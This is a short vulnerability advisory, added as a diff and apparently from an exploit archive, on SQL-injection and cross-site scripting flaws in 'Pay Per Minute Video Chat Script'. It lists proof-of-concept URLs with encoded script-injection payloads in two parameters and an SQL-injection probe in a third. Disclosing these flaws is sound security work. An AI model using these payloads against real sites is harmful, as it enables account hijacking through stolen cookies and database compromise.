@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/40585/info
+
+Pay Per Minute Video Chat Script is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Cross-site scripting:
+
+http://www.example.com/P47H/admin/memberviewdetails.php?id=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E
+ 
+http://www.example.com/P47H/videos.php?model=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E
+
+
+SQL-injection:
+
+http://www.example.com/P47H/index_ie.php?page=-666
